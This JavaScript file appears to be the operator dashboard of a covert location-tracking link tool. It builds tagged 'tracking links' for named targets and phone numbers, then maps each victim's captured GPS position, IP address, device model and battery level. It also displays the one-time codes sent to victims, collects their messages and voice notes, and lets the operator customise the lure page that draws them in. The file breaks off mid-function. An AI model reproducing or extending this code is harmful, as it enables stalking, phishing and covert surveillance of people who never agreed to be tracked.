// Authorized Admin Dashboard Logic

let adminKey = sessionStorage.getItem('adminKey') || '';
let adminMap = null;
let mapMarkers = [];
let eventSource = null;
let cachedLocations = [];

// Elements
const authOverlay = document.getElementById('authOverlay');
const authKeyInput = document.getElementById('authKeyInput');
const authSubmitBtn = document.getElementById('authSubmitBtn');
const authError = document.getElementById('authError');
const logoutBtn = document.getElementById('logoutBtn');

const alertBanner = document.getElementById('alertBanner');
const alertBannerText = document.getElementById('alertBannerText');
const sseStatus = document.getElementById('sseStatus');

const targetTagInput = document.getElementById('targetTagInput');
const targetPhoneInput = document.getElementById('targetPhoneInput');
const generateLinkBtn = document.getElementById('generateLinkBtn');
const linkResultText = document.getElementById('linkResultText');
const copyLinkBtn = document.getElementById('copyLinkBtn');

const totalHits = document.getElementById('totalHits');
const uniqueIps = document.getElementById('uniqueIps');
const avgAccuracy = document.getElementById('avgAccuracy');
const dbCountBadge = document.getElementById('dbCountBadge');
const dbTableBody = document.getElementById('dbTableBody');
const refreshBtn = document.getElementById('refreshBtn');
const clearAllBtn = document.getElementById('clearAllBtn');
const exportCsvBtn = document.getElementById('exportCsvBtn');

let cachedQueries = [];
const totalQueries = document.getElementById('totalQueries');
const queryCountBadge = document.getElementById('queryCountBadge');
const queriesListContainer = document.getElementById('queriesListContainer');
const refreshQueriesBtn = document.getElementById('refreshQueriesBtn');
const exportQueriesCsvBtn = document.getElementById('exportQueriesCsvBtn');
const clearAllQueriesBtn = document.getElementById('clearAllQueriesBtn');

// --------------------------------------------------------------------------
// Sound Alert (Web Audio Synthesizer)
// --------------------------------------------------------------------------
function playIntelAlertChime() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();

    osc.type = 'sine';
    osc.frequency.setValueAtTime(587.33, ctx.currentTime); // D5
    osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.15); // A5

    gain.gain.setValueAtTime(0.3, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.4);

    osc.connect(gain);
    gain.connect(ctx.destination);

    osc.start();
    osc.stop(ctx.currentTime + 0.4);
  } catch (e) {
    console.warn('Audio chime blocked or unavailable:', e);
  }
}

// --------------------------------------------------------------------------
// Safe JSON Fetcher & API Base
// --------------------------------------------------------------------------
const API_BASE = (window.location.protocol === 'file:' || (window.location.port && window.location.port !== '3000' && (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')))
  ? 'http://localhost:3000'
  : '';

async function safeFetchJson(endpoint, options = {}) {
  const fullUrl = endpoint.startsWith('http') ? endpoint : `${API_BASE}${endpoint}`;
  let res;
  try {
    res = await fetch(fullUrl, options);
  } catch (netErr) {
    throw new Error(`Cannot connect to server (${netErr.message}). Make sure 'node server.js' is running on port 3000.`);
  }

  const contentType = res.headers.get('content-type') || '';
  if (contentType.includes('application/json')) {
    const data = await res.json();
    if (!res.ok) {
      throw new Error(data.error || `Server error (HTTP ${res.status})`);
    }
    return data;
  }

  const rawText = await res.text();
  const match = rawText.match(/<pre>(.*?)<\/pre>/s);
  const cleanMsg = match ? match[1].replace(/<[^>]+>/g, '').trim() : '';

  if (cleanMsg) {
    throw new Error(`${cleanMsg}. (Please restart server: node server.js)`);
  }

  if (rawText.includes('<!DOCTYPE') || rawText.includes('<html')) {
    throw new Error(`Server returned HTML (HTTP ${res.status}). Server ko restart karein: node server.js`);
  }

  try {
    return JSON.parse(rawText);
  } catch (e) {
    throw new Error(`Invalid response (HTTP ${res.status}): ${rawText.slice(0, 100)}`);
  }
}

// --------------------------------------------------------------------------
// Authentication Flow
// --------------------------------------------------------------------------
async function verifyAuth(key) {
  try {
    const data = await safeFetchJson('/api/admin/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key })
    });
    return data.success;
  } catch (e) {
    return false;
  }
}

async function handleLogin() {
  const enteredKey = authKeyInput.value.trim();
  if (!enteredKey) return;

  const valid = await verifyAuth(enteredKey);
  if (valid) {
    adminKey = enteredKey;
    sessionStorage.setItem('adminKey', adminKey);
    authOverlay.style.display = 'none';
    authError.style.display = 'none';
    initializeDashboard();
  } else {
    authError.style.display = 'block';
  }
}

authSubmitBtn.addEventListener('click', handleLogin);
authKeyInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') handleLogin();
});

function handleLogout() {
  // Clear all admin session credentials
  sessionStorage.removeItem('adminKey');
  localStorage.removeItem('adminKey');
  adminKey = '';
  if (eventSource) {
    eventSource.close();
    eventSource = null;
  }
  // Direct logout: immediately redirect to home page without asking anything
  window.location.href = '/';
}

if (logoutBtn) {
  logoutBtn.addEventListener('click', handleLogout);
}

// --------------------------------------------------------------------------
// Dashboard Initialization
// --------------------------------------------------------------------------
async function initializeDashboard() {
  initMap();
  updateLinkDisplay('Visitor_1');
  await loadDatabaseRecords();
  await loadQueriesRecords();
  await loadAdminConfig();
  connectSSEStream();
}

// --------------------------------------------------------------------------
// Map Initialization
// --------------------------------------------------------------------------
function initMap() {
  if (!adminMap) {
    adminMap = L.map('adminMap').setView([20, 0], 2);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
      attribution: '&copy; OpenStreetMap &copy; CARTO',
      subdomains: 'abcd',
      maxZoom: 19
    }).addTo(adminMap);
  }
}

function plotTargetsOnMap(records) {
  if (!adminMap) return;

  // Clear existing markers
  mapMarkers.forEach(m => adminMap.removeLayer(m));
  mapMarkers = [];

  if (records.length === 0) {
    adminMap.setView([20, 0], 2);
    return;
  }

  const bounds = [];

  records.forEach((rec, idx) => {
    const isLatest = idx === 0;
    const pinColor = isLatest ? '#10b981' : '#06b6d4';

    const icon = L.divIcon({
      className: 'admin-marker',
      html: `<div style="
        width: 14px;
        height: 14px;
        background: ${pinColor};
        border: 2px solid #ffffff;
        border-radius: 50%;
        box-shadow: 0 0 10px ${pinColor};
      "></div>`,
      iconSize: [14, 14],
      iconAnchor: [7, 7]
    });

    const marker = L.marker([rec.latitude, rec.longitude], { icon }).addTo(adminMap);
    const phoneDisplay = rec.phoneNumber && rec.phoneNumber !== 'N/A' 
      ? `<br><b>Phone:</b> <a href="tel:${rec.phoneNumber}" style="color: #38bdf8;">${escapeHtml(rec.phoneNumber)}</a>` 
      : '';

    marker.bindPopup(`
      <div style="font-family: sans-serif; font-size: 0.85rem; line-height: 1.5;">
        <strong style="color: #06b6d4;">[${rec.tag}] Target #${rec.id}</strong>
        ${phoneDisplay}<br>
        <b>Lat:</b> ${rec.latitude.toFixed(5)}<br>
        <b>Lon:</b> ${rec.longitude.toFixed(5)}<br>
        <b>Accuracy:</b> ±${Math.round(rec.accuracy || 0)}m<br>
        <b>IP:</b> ${rec.clientIp}<br>
        <b>Time:</b> ${new Date(rec.createdAt || rec.clientTimestamp).toLocaleTimeString()}<br>
        <a href="https://www.google.com/maps?q=${rec.latitude},${rec.longitude}" target="_blank" style="color: #3b82f6;">Open in Google Maps &rarr;</a>
      </div>
    `);

    mapMarkers.push(marker);
    bounds.push([rec.latitude, rec.longitude]);
  });

  if (bounds.length > 0) {
    adminMap.fitBounds(bounds, { maxZoom: 14, padding: [40, 40] });
  }
}

// --------------------------------------------------------------------------
// Real-Time SSE Stream
// --------------------------------------------------------------------------
function connectSSEStream() {
  if (eventSource) eventSource.close();

  const streamUrl = `${API_BASE}/api/admin/stream?adminKey=${encodeURIComponent(adminKey)}`;
  eventSource = new EventSource(streamUrl);

  eventSource.onopen = () => {
    sseStatus.textContent = 'SSE Active &bull; Real-Time Listening';
    sseStatus.style.color = 'var(--accent-emerald)';
  };

  eventSource.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'NEW_LOCATION') {
        handleIncomingNewTarget(data.record);
      } else if (data.type === 'OTP_SENT') {
        playIntelAlertChime();
        alertBannerText.textContent = `📲 Real-Time OTP Sent to ${data.phoneNumber} | Code: [${data.code}]`;
        alertBanner.style.display = 'flex';
        setTimeout(() => { alertBanner.style.display = 'none'; }, 8000);
      } else if (data.type === 'OTP_VERIFIED') {
        alertBannerText.textContent = `✅ OTP Verified for ${data.phoneNumber}! Awaiting location...`;
        alertBanner.style.display = 'flex';
        setTimeout(() => { alertBanner.style.display = 'none'; }, 6000);
      } else if (data.type === 'RECORD_DELETED' || data.type === 'ALL_CLEARED') {
        loadDatabaseRecords();
      } else if (data.type === 'NEW_QUERY') {
        playIntelAlertChime();
        const isVoice = !!data.query.audioUrl;
        const label = isVoice ? '🎙️ [New Voice Note]' : '💬 [New Question]';
        const preview = data.query.query ? `"${data.query.query}"` : 'Audio voice message received';
        alertBannerText.textContent = `${label} from ${data.query.phoneNumber}: ${preview}`;
        alertBanner.style.display = 'flex';
        setTimeout(() => { alertBanner.style.display = 'none'; }, 8000);
        handleIncomingNewQuery(data.query);
      } else if (data.type === 'QUERY_DELETED' || data.type === 'ALL_QUERIES_CLEARED') {
        loadQueriesRecords();
      } else if (data.type === 'CONFIG_UPDATED') {
        loadAdminConfig();
      }
    } catch (e) {
      console.error('SSE parse error:', e);
    }
  };

  eventSource.onerror = () => {
    sseStatus.textContent = 'SSE Reconnecting...';
    sseStatus.style.color = 'var(--accent-rose)';
  };
}

function handleIncomingNewTarget(record) {
  // Play Audio Alert
  playIntelAlertChime();

  // Show Alert Banner
  alertBannerText.textContent = `🚨 Captured [${record.tag}] from IP ${record.clientIp} at ${new Date().toLocaleTimeString()}!`;
  alertBanner.style.display = 'flex';
  setTimeout(() => {
    alertBanner.style.display = 'none';
  }, 6000);

  // Add to cached list
  cachedLocations.unshift(record);
  renderTable(cachedLocations);
  updateMetrics(cachedLocations);
  plotTargetsOnMap(cachedLocations);

  // Pan map to new coordinate
  if (adminMap) {
    adminMap.flyTo([record.latitude, record.longitude], 15, { duration: 1.2 });
  }
}

// --------------------------------------------------------------------------
// Load SQLite Database Records
// --------------------------------------------------------------------------
async function loadDatabaseRecords() {
  try {
    const data = await safeFetchJson('/api/admin/locations', {
      headers: { 'x-admin-key': adminKey }
    });
    if (data.success) {
      cachedLocations = data.locations || [];
      renderTable(cachedLocations);
      updateMetrics(cachedLocations);
      plotTargetsOnMap(cachedLocations);
    }
  } catch (e) {
    console.error('Failed to load DB:', e.message);
  }
}

// --------------------------------------------------------------------------
// Render Table & Metrics
// --------------------------------------------------------------------------
function renderTable(locations) {
  dbCountBadge.textContent = `${locations.length} records in SQLite`;

  if (locations.length === 0) {
    dbTableBody.innerHTML = `
      <tr>
        <td colspan="9" style="text-align: center; color: var(--text-dim); padding: 2rem;">
          No targets captured yet. Send a tracking link to begin.
        </td>
      </tr>
    `;
    return;
  }

  dbTableBody.innerHTML = locations.map(item => {
    const date = new Date(item.createdAt || item.clientTimestamp).toLocaleDateString([], { month: 'short', day: 'numeric' });
    const time = new Date(item.createdAt || item.clientTimestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const lat = Number(item.latitude).toFixed(5);
    const lon = Number(item.longitude).toFixed(5);
    const acc = item.accuracy ? `±${Math.round(item.accuracy)}m` : 'N/A';

    // Parse user agent & exact device model
    const ua = item.userAgent || '';
    let os = 'Desktop';
    if (/android/i.test(ua)) os = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
    else if (/windows/i.test(ua)) os = 'Windows';
    else if (/macintosh|mac os x/i.test(ua)) os = 'Mac';
    else if (/linux/i.test(ua)) os = 'Linux';

    let browser = 'Browser';
    if (/chrome|crios/i.test(ua)) browser = 'Chrome';
    else if (/safari/i.test(ua)) browser = 'Safari';
    else if (/firefox/i.test(ua)) browser = 'Firefox';
    else if (/edg/i.test(ua)) browser = 'Edge';

    const deviceModelName = item.deviceModel && item.deviceModel !== 'Unknown Device'
      ? item.deviceModel
      : (os === 'Android' ? 'Android Device' : (os === 'iOS' ? 'Apple iPhone' : os));

    const userQueries = cachedQueries.filter(q => q.phoneNumber && item.phoneNumber && q.phoneNumber.replace(/[^0-9]/g, '') === item.phoneNumber.replace(/[^0-9]/g, ''));
    const hasAudioQuery = userQueries.some(q => q.audioUrl);
    const audioBadgeSnippet = hasAudioQuery ? ' 🎙️' : '';
    const queryBadge = userQueries.length > 0 
      ? `<a href="#queriesSectionCard" style="display: inline-block; font-size: 0.68rem; color: #38bdf8; background: rgba(6, 182, 212, 0.15); border: 1px solid rgba(6, 182, 212, 0.3); padding: 1px 6px; border-radius: 4px; margin-top: 2px; text-decoration: none;" title="${escapeHtml(userQueries[0].query || 'Voice note')}">💬 ${userQueries.length} Query${userQueries.length > 1 ? 'ies' : ''}${audioBadgeSnippet}</a>` 
      : '';

    const phone = item.phoneNumber && item.phoneNumber !== 'N/A'
      ? `<div style="display: flex; flex-direction: column; gap: 2px;">
           <a href="https://wa.me/${item.phoneNumber.replace(/[^0-9]/g, '')}" target="_blank" style="color: #10b981; text-decoration: none; font-weight: 600;" title="WhatsApp / Call">
             ${escapeHtml(item.phoneNumber)} 💬
           </a>
           <span style="font-size: 0.68rem; color: #34d399; font-weight: 600;">✓ OTP VERIFIED</span>
           ${queryBadge}
         </div>`
      : `<span style="color: var(--text-dim);">N/A</span>`;

    return `
      <tr>
        <td style="color: var(--text-dim);">#${item.id}</td>
        <td><span class="tag-badge">${escapeHtml(item.tag || 'General')}</span></td>
        <td>${phone}</td>
        <td>
          <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="btn-map-link">
            ${lat}, ${lon} ↗
          </a>
        </td>
        <td style="color: var(--accent-cyan);">${acc}</td>
        <td>${escapeHtml(item.clientIp)}</td>
        <td>
          <div style="display: flex; flex-direction: column; gap: 2px;">
            <span style="color: #fff; font-weight: 600; font-size: 0.85rem;">📱 ${escapeHtml(deviceModelName)}</span>
            <span style="color: var(--text-dim); font-size: 0.73rem;">${os} &bull; ${browser}</span>
          </div>
        </td>
        <td style="color: var(--text-dim); font-size: 0.75rem;">${escapeHtml(item.batteryLevel || 'N/A')} &bull; ${escapeHtml(item.screenResolution || 'N/A')}</td>
        <td>${date} <span style="color: var(--text-dim);">${time}</span></td>
        <td>
          <button type="button" class="btn-action" onclick="deleteRecord(${item.id})">Delete</button>
        </td>
      </tr>
    `;
  }).join('');
}

function updateMetrics(locations) {
  totalHits.textContent = locations.length;
  const uniqueIpSet = new Set(locations.map(l => l.clientIp));
  uniqueIps.textContent = uniqueIpSet.size;

  if (locations.length > 0) {
    const accuracies = locations.filter(l => l.accuracy).map(l => Number(l.accuracy));
    if (accuracies.length > 0) {
      const avg = Math.round(accuracies.reduce((a, b) => a + b, 0) / accuracies.length);
      avgAccuracy.textContent = `±${avg}m`;
    } else {
      avgAccuracy.textContent = '--';
    }
  } else {
    avgAccuracy.textContent = '--';
  }
}

// --------------------------------------------------------------------------
// Actions (Delete, Clear, Export)
// --------------------------------------------------------------------------
window.deleteRecord = async function (id) {
  if (!confirm(`Delete record #${id}?`)) return;
  try {
    await safeFetchJson(`/api/admin/locations/${id}`, {
      method: 'DELETE',
      headers: { 'x-admin-key': adminKey }
    });
    loadDatabaseRecords();
  } catch (e) {
    alert('Failed to delete: ' + e.message);
  }
};

clearAllBtn.addEventListener('click', async () => {
  if (!confirm('Are you sure you want to CLEAR the entire database? This cannot be undone.')) return;
  try {
    await safeFetchJson('/api/admin/locations', {
      method: 'DELETE',
      headers: { 'x-admin-key': adminKey }
    });
    loadDatabaseRecords();
  } catch (e) {
    alert('Failed to clear database: ' + e.message);
  }
});

exportCsvBtn.addEventListener('click', () => {
  if (cachedLocations.length === 0) {
    alert('No records to export');
    return;
  }

  const headers = ['ID', 'Tag', 'PhoneNumber', 'DeviceModel', 'Latitude', 'Longitude', 'Accuracy', 'IP', 'UserAgent', 'Screen', 'Battery', 'Timestamp'];
  const rows = cachedLocations.map(l => [
    l.id,
    `"${(l.tag || '').replace(/"/g, '""')}"`,
    `"${(l.phoneNumber || 'N/A').replace(/"/g, '""')}"`,
    `"${(l.deviceModel || 'N/A').replace(/"/g, '""')}"`,
    l.latitude,
    l.longitude,
    l.accuracy || '',
    l.clientIp || '',
    `"${(l.userAgent || '').replace(/"/g, '""')}"`,
    l.screenResolution || '',
    l.batteryLevel || '',
    l.createdAt || l.clientTimestamp
  ]);

  const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(e => e.join(','))].join('\n');
  const encodedUri = encodeURI(csvContent);
  const link = document.createElement('a');
  link.setAttribute('href', encodedUri);
  link.setAttribute('download', `tracking_database_${Date.now()}.csv`);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
});

refreshBtn.addEventListener('click', loadDatabaseRecords);

// --------------------------------------------------------------------------
// User Queries & Questions Management Logic
// --------------------------------------------------------------------------
async function loadQueriesRecords() {
  try {
    const data = await safeFetchJson('/api/admin/queries', {
      headers: { 'x-admin-key': adminKey }
    });
    if (data.success) {
      cachedQueries = data.queries || [];
      renderQueries(cachedQueries);
      if (cachedLocations.length > 0) {
        renderTable(cachedLocations);
      }
    }
  } catch (e) {
    console.error('Failed to load queries:', e.message);
  }
}

function handleIncomingNewQuery(newQuery) {
  cachedQueries.unshift(newQuery);
  renderQueries(cachedQueries);
  if (cachedLocations.length > 0) {
    renderTable(cachedLocations);
  }
}

function renderQueries(queries) {
  if (totalQueries) totalQueries.textContent = queries.length;
  if (queryCountBadge) queryCountBadge.textContent = `${queries.length} Queries`;

  if (!queriesListContainer) return;

  if (queries.length === 0) {
    queriesListContainer.innerHTML = `
      <div id="noQueriesMsg" style="text-align: center; color: var(--text-dim); padding: 2rem 1rem; font-size: 0.85rem;">
        Abhi tak kisi user ne sawal nahi bheja hai. Jaise hi koi sawal puchega, yahan real-time sound ke sath live show hoga!
      </div>
    `;
    return;
  }

  queriesListContainer.innerHTML = queries.map(q => {
    const date = new Date(q.createdAt).toLocaleDateString([], { month: 'short', day: 'numeric' });
    const time = new Date(q.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const cleanPhone = (q.phoneNumber || '').replace(/[^0-9]/g, '');
    const hasPhone = cleanPhone && cleanPhone.length >= 10;
    const hasAudio = !!q.audioUrl;
    
    // WhatsApp reply message text
    let replyMsg = 'Hi bhai!';
    if (q.query) {
      replyMsg = `Hi bhai, regarding your question: "${q.query.slice(0, 45)}..."`;
    } else if (hasAudio) {
      replyMsg = `Hi bhai, aapka voice note mujhe mil gaya hai!`;
    }
    const whatsappUrl = `https://wa.me/${cleanPhone}?text=${encodeURIComponent(replyMsg)}`;

    return `
      <div class="query-card-item" style="background: rgba(15, 23, 42, 0.85); border: 1px solid rgba(6, 182, 212, 0.25); border-radius: 14px; padding: 1.1rem 1.25rem; display: flex; flex-direction: column; gap: 0.75rem; transition: border-color 0.2s;">
        <div style="display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 0.5rem;">
          <div style="display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap;">
            <span class="tag-badge" style="font-size: 0.72rem;">#${q.id} &bull; ${escapeHtml(q.tag || 'General')}</span>
            <span style="color: #38bdf8; font-family: var(--mono); font-size: 0.95rem; font-weight: 700;">
              ${escapeHtml(q.phoneNumber || 'N/A')}
            </span>
            ${hasPhone ? `<span style="font-size: 0.7rem; color: #10b981; background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); padding: 0.15rem 0.45rem; border-radius: 999px;">✓ Verified Mobile</span>` : ''}
            ${hasAudio ? `<span style="font-size: 0.7rem; color: #c084fc; background: rgba(168, 85, 247, 0.15); border: 1px solid rgba(168, 85, 247, 0.35); padding: 0.15rem 0.55rem; border-radius: 999px; font-weight: 600;">🎙️ Voice Note ${q.audioDuration ? `(${q.audioDuration}s)` : ''}</span>` : ''}
          </div>

          <div style="display: flex; align-items: center; gap: 0.65rem;">
            <span style="font-size: 0.75rem; color: var(--text-dim); font-family: var(--mono);">${date} <span style="color: var(--text-muted);">${time}</span></span>
            <button type="button" class="btn-action" onclick="deleteQuery(${q.id})" style="padding: 0.25rem 0.55rem; font-size: 0.72rem; color: var(--text-dim);" title="Delete question">
              🗑️ Delete
            </button>
          </div>
        </div>

        <!-- Question Bubble (if user entered text) -->
        ${q.query ? `
        <div style="background: rgba(6, 182, 212, 0.08); border-left: 3px solid var(--accent-cyan); border-radius: 0 10px 10px 0; padding: 0.8rem 1rem; color: #fff; font-size: 0.95rem; line-height: 1.5; font-weight: 500;">
          "${escapeHtml(q.query)}"
        </div>
        ` : ''}

        <!-- Audio Player Box (if user sent voice note) -->
        ${hasAudio ? `
        <div style="background: rgba(139, 92, 246, 0.08); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 12px; padding: 0.75rem 1rem; display: flex; flex-direction: column; gap: 0.5rem;">
          <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.35rem;">
            <div style="display: flex; align-items: center; gap: 0.4rem; font-size: 0.8rem; font-weight: 700; color: #c084fc;">
              <span>🎙️ Voice Message Audio</span>
              ${q.audioDuration ? `<span style="font-size: 0.7rem; color: #e2e8f0; font-family: var(--mono); background: rgba(139, 92, 246, 0.25); padding: 1px 6px; border-radius: 99px;">${q.audioDuration}s</span>` : ''}
            </div>
            <a href="${q.audioUrl}" download="voice_${q.phoneNumber || q.id}.webm" target="_blank" style="font-size: 0.72rem; color: #38bdf8; text-decoration: none; font-weight: 600; display: inline-flex; align-items: center; gap: 0.25rem;">
              ⬇️ Download Audio
            </a>
          </div>
          <audio controls preload="metadata" style="width: 100%; height: 38px; outline: none; border-radius: 8px;">
            <source src="${q.audioUrl}">
            Your browser does not support audio playback.
          </audio>
        </div>
        ` : ''}

        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.6rem;">
          <div style="font-size: 0.73rem; color: var(--text-dim); display: flex; gap: 0.85rem; font-family: var(--mono);">
            <span>🌐 IP: ${escapeHtml(q.clientIp || 'N/A')}</span>
          </div>

          ${hasPhone ? `
            <a href="${whatsappUrl}" target="_blank" class="query-whatsapp-btn" style="display: inline-flex; align-items: center; gap: 0.4rem; background: #10b981; color: #000; font-weight: 700; padding: 0.4rem 0.85rem; border-radius: 8px; font-size: 0.78rem; text-decoration: none; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);" onmouseover="this.style.opacity='0.9'" onmouseout="this.style.opacity='1'">
              💬 Reply on WhatsApp
            </a>
          ` : ''}
        </div>
      </div>
    `;
  }).join('');
}

window.deleteQuery = async function (id) {
  if (!confirm(`Delete query #${id}?`)) return;
  try {
    await safeFetchJson(`/api/admin/queries/${id}`, {
      method: 'DELETE',
      headers: { 'x-admin-key': adminKey }
    });
    loadQueriesRecords();
  } catch (e) {
    alert('Failed to delete query: ' + e.message);
  }
};

if (clearAllQueriesBtn) {
  clearAllQueriesBtn.addEventListener('click', async () => {
    if (!confirm('Are you sure you want to clear ALL user queries? This cannot be undone.')) return;
    try {
      await safeFetchJson('/api/admin/queries', {
        method: 'DELETE',
        headers: { 'x-admin-key': adminKey }
      });
      loadQueriesRecords();
    } catch (e) {
      alert('Failed to clear queries: ' + e.message);
    }
  });
}

if (exportQueriesCsvBtn) {
  exportQueriesCsvBtn.addEventListener('click', () => {
    if (cachedQueries.length === 0) {
      alert('No queries to export');
      return;
    }

    const headers = ['ID', 'Tag', 'PhoneNumber', 'Query', 'HasAudio', 'AudioURL', 'DurationSeconds', 'IP', 'UserAgent', 'Timestamp'];
    const rows = cachedQueries.map(q => [
      q.id,
      `"${(q.tag || '').replace(/"/g, '""')}"`,
      `"${(q.phoneNumber || 'N/A').replace(/"/g, '""')}"`,
      `"${(q.query || '').replace(/"/g, '""')}"`,
      q.audioUrl ? 'YES' : 'NO',
      `"${(q.audioUrl || '').replace(/"/g, '""')}"`,
      q.audioDuration || '',
      q.clientIp || '',
      `"${(q.userAgent || '').replace(/"/g, '""')}"`,
      q.createdAt
    ]);

    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(e => e.join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `user_queries_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  });
}

if (refreshQueriesBtn) {
  refreshQueriesBtn.addEventListener('click', loadQueriesRecords);
}

// --------------------------------------------------------------------------
// Tracking Link Generator
// --------------------------------------------------------------------------
function updateLinkDisplay(tag, phone = '') {
  const origin = window.location.origin;
  let link = `${origin}/?tag=${encodeURIComponent(tag)}`;
  if (phone) {
    link += `&phone=${encodeURIComponent(phone)}`;
  }
  linkResultText.textContent = link;
}

generateLinkBtn.addEventListener('click', () => {
  const tag = targetTagInput.value.trim() || 'Visitor_' + Math.floor(Math.random() * 1000);
  const phone = targetPhoneInput ? targetPhoneInput.value.trim() : '';
  updateLinkDisplay(tag, phone);
});

copyLinkBtn.addEventListener('click', () => {
  navigator.clipboard.writeText(linkResultText.textContent);
  copyLinkBtn.textContent = 'Copied!';
  setTimeout(() => { copyLinkBtn.textContent = 'Copy Link'; }, 2000);
});

// --------------------------------------------------------------------------
// Live Frontend UI Customizer Logic (Full Control Access)
// --------------------------------------------------------------------------
const configForm = document.getElementById('configForm');
const cfgName = document.getElementById('cfgName');
const cfgTitle = document.getElementById('cfgTitle');
const cfgBio = document.getElementById('cfgBio');
const cfgPageTitle = document.getElementById('cfgPageTitle');
const cfgButtonText = document.getElementById('cfgButtonText');
const cfgImgUrl = document.getElementById('cfgImgUrl');
const cfgDefaultCountry = document.getElementById('cfgDefaultCountry');
const cfgRequirePhone = document.getElementById('cfgRequirePhone');
const cfgRequireOtp = document.getElementById('cfgRequireOtp');
const cfgThemeColor = document.getElementById('cfgThemeColor');
const cfgSuccessTitle = document.getElementById('cfgSuccessTitle');
const cfgSuccessMessage = document.getElementById('cfgSuccessMessage');
const configSaveStatus = document.getElementById('configSaveStatus');
const adminDpPreview = document.getElementById('adminDpPreview');
const dpFileInput = document.getElementById('dpFileInput');
const triggerUploadBtn = document.getElementById('triggerUploadBtn');
const dpUploadStatus = document.getElementById('dpUploadStatus');

// Update preview when manual URL input changes
if (cfgImgUrl && adminDpPreview) {
  cfgImgUrl.addEventListener('input', () => {
    const val = cfgImgUrl.value.trim();
    if (val) {
      adminDpPreview.src = val;
    }
  });
}

// --------------------------------------------------------------------------
// Interactive Photo Cropper & Face Framing Studio
// --------------------------------------------------------------------------
const cropModal = document.getElementById('cropModal');
const closeCropModalBtn = document.getElementById('closeCropModalBtn');
const cancelCropBtn = document.getElementById('cancelCropBtn');
const saveCropBtn = document.getElementById('saveCropBtn');
const saveCropBtnText = document.getElementById('saveCropBtnText');
const cropCanvas = document.getElementById('cropCanvas');
const cropZoomSlider = document.getElementById('cropZoomSlider');
const cropZoomInBtn = document.getElementById('cropZoomInBtn');
const cropZoomOutBtn = document.getElementById('cropZoomOutBtn');
const cropZoomValue = document.getElementById('cropZoomValue');
const cropRotateBtn = document.getElementById('cropRotateBtn');
const cropCenterBtn = document.getElementById('cropCenterBtn');
const openCropperBtn = document.getElementById('openCropperBtn');

let cropCtx = null;
if (cropCanvas) {
  cropCtx = cropCanvas.getContext('2d');
}

const CROP_CANVAS_SIZE = 320;
const CROP_CIRCLE_RADIUS = 125;
const CROP_CENTER = CROP_CANVAS_SIZE / 2;

let cropImageObj = new Image();
let cropState = {
  posX: CROP_CENTER,
  posY: CROP_CENTER,
  baseScale: 1,
  scale: 1,
  rotation: 0,
  isDragging: false,
  dragStartX: 0,
  dragStartY: 0,
  initialPosX: CROP_CENTER,
  initialPosY: CROP_CENTER,
  touchDist: 0
};

function drawCropView() {
  if (!cropCtx || !cropImageObj.complete || !cropImageObj.naturalWidth) return;

  cropCtx.clearRect(0, 0, CROP_CANVAS_SIZE, CROP_CANVAS_SIZE);

  // Background
  cropCtx.fillStyle = '#0b1120';
  cropCtx.fillRect(0, 0, CROP_CANVAS_SIZE, CROP_CANVAS_SIZE);

  // Draw image with active transform
  cropCtx.save();
  cropCtx.translate(cropState.posX, cropState.posY);
  cropCtx.rotate((cropState.rotation * Math.PI) / 180);
  cropCtx.scale(cropState.scale, cropState.scale);
  cropCtx.drawImage(cropImageObj, -cropImageObj.naturalWidth / 2, -cropImageObj.naturalHeight / 2);
  cropCtx.restore();

  // Dark overlay mask outside the circle
  cropCtx.save();
  cropCtx.fillStyle = 'rgba(10, 15, 29, 0.72)';
  cropCtx.beginPath();
  cropCtx.rect(0, 0, CROP_CANVAS_SIZE, CROP_CANVAS_SIZE);
  cropCtx.arc(CROP_CENTER, CROP_CENTER, CROP_CIRCLE_RADIUS, 0, Math.PI * 2, true);
  cropCtx.fill();

  // Circular guide border
  cropCtx.beginPath();
  cropCtx.arc(CROP_CENTER, CROP_CENTER, CROP_CIRCLE_RADIUS, 0, Math.PI * 2);
  cropCtx.strokeStyle = '#06b6d4';
  cropCtx.lineWidth = 2.5;
  cropCtx.shadowColor = 'rgba(6, 182, 212, 0.6)';
  cropCtx.shadowBlur = 10;
  cropCtx.stroke();

  // Face alignment center crosshair guide
  cropCtx.shadowBlur = 0;
  cropCtx.strokeStyle = 'rgba(255, 255, 255, 0.22)';
  cropCtx.lineWidth = 1;
  cropCtx.setLineDash([4, 4]);
  cropCtx.beginPath();
  // Vertical line
  cropCtx.moveTo(CROP_CENTER, CROP_CENTER - CROP_CIRCLE_RADIUS + 25);
  cropCtx.lineTo(CROP_CENTER, CROP_CENTER + CROP_CIRCLE_RADIUS - 25);
  // Horizontal line
  cropCtx.moveTo(CROP_CENTER - CROP_CIRCLE_RADIUS + 25, CROP_CENTER);
